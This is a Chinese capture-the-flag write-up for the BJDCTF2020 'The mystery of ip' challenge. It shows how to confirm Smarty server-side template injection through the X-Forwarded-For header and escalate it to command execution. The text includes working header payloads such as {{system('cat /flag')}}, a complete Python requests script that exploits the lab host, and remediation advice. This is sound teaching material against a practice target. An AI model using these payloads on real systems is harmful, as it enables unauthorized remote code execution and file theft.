# Writeup 4 [BJDCTF2020] The mystery of ip



## 题目信息

- **题目名称**：[BJDCTF2020] The mystery of ip
- **题目类型**：Web
- **考点**：SSTI（服务端模板注入）、Smarty 模板引擎、HTTP 请求头注入
- **目标**：获取靶机上的 flag

---



## 一、信息收集

### 1.1 访问靶机

靶机地址：

```
http://node5.buuoj.cn:25299
```

首页是一个欢迎页面，导航栏有 `Flag` 和 `Hint` 两个链接。

### 1.2 访问 Hint 页面

页面源码中包含一行 HTML 注释：

```html
			<div class="jumbotron jumb">
				<h3>Welcome to BJDCTF 2020.Happy Game!</h3>
				<!-- Do you know why i know your ip? -->
				<div class="shaky" style="font-size:20px;">(｡･∀･)ﾉﾞ♥</div>
			</div>
```

提示我们题目与 **IP 地址**有关。

### 1.3 访问 Flag 页面

访问 `http://node5.buuoj.cn:25299/flag.php`

页面显示：

```
Your IP is : 192.168.122.15
```

说明后端获取了客户端的 IP 地址并显示在页面上。

---

## 二、发现注入点

### 2.1 测试 IP 伪造

常见的伪造 IP 的请求头有：

- `X-Forwarded-For`
- `Client-IP`
- `X-Real-IP`
- `X-Remote-IP`

使用 HackBar，添加请求头：

```bash
X-Forwarded-For: 1.2.3.4
```

![](https://raw.gitcode.com/hengdonghui/pic-blog/raw/main/01_IP.png)

点击 HackBar 的 Execute 按钮，页面显示：

![](https://raw.gitcode.com/hengdonghui/pic-blog/raw/main/02_IP.png)

**结论**：

`X-Forwarded-For` 头的值会被后端获取并直接显示在页面上，存在注入可能。

### 2.2 测试 SSTI

尝试常见的模板注入 Payload：

```bash
X-Forwarded-For: {{7*7}}
```

返回页面显示：

```
Your IP is : 49
```

✅ `{{7*7}}` 被成功解析为 `49`，确认存在 **SSTI（服务端模板注入）**漏洞。

---



## 三、判断模板引擎

### 3.1 常见模板引擎特征

| Payload                 | Jinja2 (Python) | Twig (PHP) | Smarty (PHP)                |
| ----------------------- | --------------- | ---------- | --------------------------- |
| `{{7*7}}`               | 49              | 49         | 49                          |
| `{$smarty.version}`     | 报错/原样       | 报错/原样  | **版本号**                  |
| `{php}phpinfo();{/php}` | 无效            | 无效       | 报错/执行代码（取决于版本） |

### 3.2 测试 Smarty 特征 Payload

首先测试 `{{7*7}}`：

```bash
X-Forwarded-For: {{7*7}}
```

返回：

```
Your IP is : 49
```

✅ 确认存在 SSTI。

接着测试 Smarty 版本探测 Payload：

```bash
X-Forwarded-For: {$smarty.version}
```

返回：

```
Your IP is : 3.1.34-dev-7
```

✅ **成功获取 Smarty 版本号**，确认模板引擎为 **Smarty**，版本为 `3.1.34-dev-7`。

### 3.3 测试 `{php}` 标签

尝试执行 PHP 代码的旧版标签：

```bash
X-Forwarded-For: {php}phpinfo();{/php}
```

返回报错信息：

```
Fatal error: Uncaught --> Smarty Compiler: Syntax error in template "string:{php}phpinfo();{/php}" on line 1 "{php}phpinfo();{/php}" {php}{/php} tags not allowed. Use SmartyBC to enable them <-- thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1
```

**关键信息**：`{php}{/php} tags not allowed. Use SmartyBC to enable them`

这说明：

- 当前使用的是 **Smarty 3.1.34** 标准版
- `{php}` 标签已被官方废弃，仅在 **SmartyBC**（向后兼容分支）中可用
- 标准版 Smarty 不允许直接执行 PHP 代码

### 3.4 模板引擎确认

根据测试结果汇总：

| 测试 Payload            | 响应结果                 | 结论                            |
| ----------------------- | ------------------------ | ------------------------------- |
| `{{7*7}}`               | `49`                     | ✅ 定界符有效                    |
| `{$smarty.version}`     | `3.1.34-dev-7`           | ✅ Smarty 版本号                 |
| `{php}phpinfo();{/php}` | 报错：`tags not allowed` | ❌ 标准版 Smarty，`{php}` 被禁用 |

**最终确认**：

模板引擎为 **Smarty 3.1.34 标准版**（非 SmartyBC）。

---

## 四、漏洞利用

### 4.1 查找可利用语法

由于 `{php}` 标签被禁用，需要寻找 Smarty 3.x 标准版中仍可用的执行方式。

查阅资料发现，Smarty 3.x 的 `{{}}` 定界符内支持使用 PHP 函数。尝试执行系统命令：

```bash
X-Forwarded-For: {{system('ls')}}
```

页面显示：

```
Your IP is : bootstrap css flag.php header.php hint.php img index.php jquery libs templates_c templates_c
```



### 4.2 读取 Flag

flag 的常见位置有：

`/flag`、`/flag.txt`、`/var/www/html/flag.php`

```bash
X-Forwarded-For: {{system('cat /flag')}}
```

页面显示：

```
Your IP is : flag{23e7147e-b229-4fb1-8021-e5e120cc0db2} flag{23e7147e-b229-4fb1-8021-e5e120cc0db2}
```

✅ Flag 获取成功！

---

## 五、漏洞原理分析

### 5.1 后端代码（推测）

```php
<?php
require_once('./smarty/libs/Smarty.class.php');
$smarty = new Smarty();
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$smarty->display("string:" . $ip);  // 直接将用户输入作为模板字符串解析
?>
```

`display("string:" . $ip)` 会把 `$ip` 的内容当作 Smarty 模板字符串进行解析。当用户传入 `{{system('cat /flag')}}` 时，Smarty 会执行其中的 PHP 代码，导致命令注入。

### 5.2 修复建议

- 不要直接将用户输入传入模板引擎的 `string:` 参数
- 对用户输入进行严格过滤或转义
- 使用白名单机制验证 IP 格式

---

## 六、完整的攻击脚本

```python
import requests

url = "http://node5.buuoj.cn:25299/flag.php"
headers = {
    "X-Forwarded-For": "{{system('cat /flag')}}"
}

resp = requests.get(url, headers=headers)

# 提取 flag
import re
match = re.search(r'Your IP is : (flag\{[^}]+\})', resp.text)
if match:
    print(f"Flag: {match.group(1)}")
else:
    print("未找到 flag，请检查 payload")
```

运行结果：

```python
Flag: flag{23e7147e-b229-4fb1-8021-e5e120cc0db2}

进程已结束，退出代码为 0
```



---

## 七、总结

| 项目         | 内容                      |
| ------------ | ------------------------- |
| 漏洞类型     | SSTI（服务端模板注入）    |
| 模板引擎     | Smarty 3.x                |
| 注入点       | `X-Forwarded-For` 请求头  |
| 利用 Payload | `{{system('cat /flag')}}` |
| 获取内容     | flag 文件内容             |

**关键点**：

1. 发现显示 IP 的位置存在注入

2. 通过 `{{7*7}}` 确认 SSTI

3. 找到正确的模板语法执行系统命令

4. 读取 `/flag` 获得最终答案

   
